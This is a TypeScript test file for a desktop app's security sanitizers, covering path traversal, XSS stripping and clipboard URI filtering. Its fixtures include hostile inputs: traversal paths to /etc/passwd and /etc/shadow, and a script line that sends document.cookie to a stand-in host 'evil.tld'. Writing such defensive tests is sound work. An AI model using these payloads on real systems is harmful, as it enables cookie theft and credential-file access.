import { describe, expect, it } from "vitest";
import {
  sanitizeClipboardUri,
  sanitizeInputText,
  validateSafePath,
} from "../security/sanitizer";

describe("Stage 1 Security Gate — PathSanitizer & Input/XSS Sanitizer", () => {
  it("security::test_rejects_path_traversal_variants", () => {
    const maliciousPaths = [
      "../../etc/passwd",
      "..\\Windows\\System32",
      "../secret.txt",
      "/Users/rawaq/Desktop/../../../etc/shadow",
      "C:\\Users\\Ahmad\\Desktop\\..\\..\\Windows\\System32\\cmd.exe",
      "folder/..%2f..%2fetc/passwd",
      "folder/%2e%2e/secret",
      "folder\\..%5c..\\secret",
      "valid_name\0.txt",
      "C:\\Users\\Ahmad\\Desktop\\file\x00.pdf",
      "\\\\evil-server\\share\\payload.exe",
      "//evil-server/share/payload.exe",
      "C:\\Windows\\System32\\drivers\\etc\\hosts",
      "/etc/passwd",
      "/proc/self/environ",
      "C:\\Users\\Ahmad\\Desktop\\CON.txt",
      "C:\\Users\\Ahmad\\Desktop\\NUL",
      "   ",
      "",
      `C:/Users/Ahmad/${"a".repeat(300)}/file.txt`,
    ];

    for (const badPath of maliciousPaths) {
      const result = validateSafePath(badPath);
      expect(
        result.valid,
        `Expected malicious path "${badPath}" to be rejected`,
      ).toBe(false);
      expect(result.reason).toBeDefined();
    }
  });

  it("accepts safe Arabic, English, and mixed-language paths within authorized roots", () => {
    const allowedRoots = [
      "C:/Users/أحمد/Desktop",
      "/home/salma/Desktop",
      "/Users/rawaq/Documents",
    ];

    const safePaths = [
      "C:\\Users\\أحمد\\Desktop\\مشاريع_2026\\تقرير_نهائي.pdf",
      "/home/salma/Desktop/ملخص_البحث_AI_2026 (v2).docx",
      "/Users/rawaq/Documents/Notes_ملاحظات_101.md",
    ];

    for (const goodPath of safePaths) {
      const res = validateSafePath(goodPath, allowedRoots);
      expect(res.valid, `Expected safe path "${goodPath}" to be accepted`).toBe(
        true,
      );
      expect(res.normalizedPath).toBeDefined();
    }

    // Rejects a syntactically clean path if it lies outside authorized roots
    const outOfScope = validateSafePath(
      "/Users/rawaq/Downloads/other.pdf",
      allowedRoots,
    );
    expect(outOfScope.valid).toBe(false);
    expect(outOfScope.reason).toBe("OUTSIDE_AUTHORIZED_SCOPE");
  });

  it("security::test_sanitizes_html_and_script_payloads", () => {
    const payloads: Array<{ raw: string; expected: string }> = [
      {
        raw: "ملاحظة هامة <script>fetch('https://evil.tld?c='+document.cookie)</script> للمشروع",
        expected: "ملاحظة هامة  للمشروع",
      },
      {
        raw: '<img src="x" onerror="alert(1)" />عنوان المهمة اليومية',
        expected: "عنوان المهمة اليومية",
      },
      {
        raw: "<ScRiPt src='http://attacker/xss.js'></sCrIpT>تقرير 2026 النهائي",
        expected: "تقرير 2026 النهائي",
      },
      {
        raw: '<svg onload="alert(document.domain)"><circle /></svg>مهمة رقم #42 (RTL & LTR)',
        expected: "مهمة رقم #42 (RTL & LTR)",
      },
      {
        raw: "اضغط هنا javascript:alert(1) أو onerror=alert(2) للمتابعة",
        expected: "اضغط هنا  أو  للمتابعة",
      },
      {
        raw: "نص عربي سليم 100% مع English words وأرقام (2026) — بدون أي كود خبيث!",
        expected:
          "نص عربي سليم 100% مع English words وأرقام (2026) — بدون أي كود خبيث!",
      },
    ];

    for (const { raw, expected } of payloads) {
      const cleaned = sanitizeInputText(raw);
      expect(cleaned).toBe(expected);
      expect(cleaned.toLowerCase()).not.toContain("<script");
      expect(cleaned.toLowerCase()).not.toContain("onerror=");
      expect(cleaned.toLowerCase()).not.toContain("onload=");
      expect(cleaned.toLowerCase()).not.toContain("javascript:");
    }
  });

  it("blocks malicious URI schemes in clipboard capture while allowing https/http", () => {
    expect(sanitizeClipboardUri("javascript:alert(1)")).toBeNull();
    expect(
      sanitizeClipboardUri("data:text/html,<script>alert(1)</script>"),
    ).toBeNull();
    expect(sanitizeClipboardUri("file:///etc/passwd")).toBeNull();
    expect(sanitizeClipboardUri("vbscript:msgbox(1)")).toBeNull();
    expect(sanitizeClipboardUri("")).toBeNull();

    expect(
      sanitizeClipboardUri("https://github.com/Heisen-lab/Rawaq-desk"),
    ).toBe("https://github.com/Heisen-lab/Rawaq-desk");
  });
});
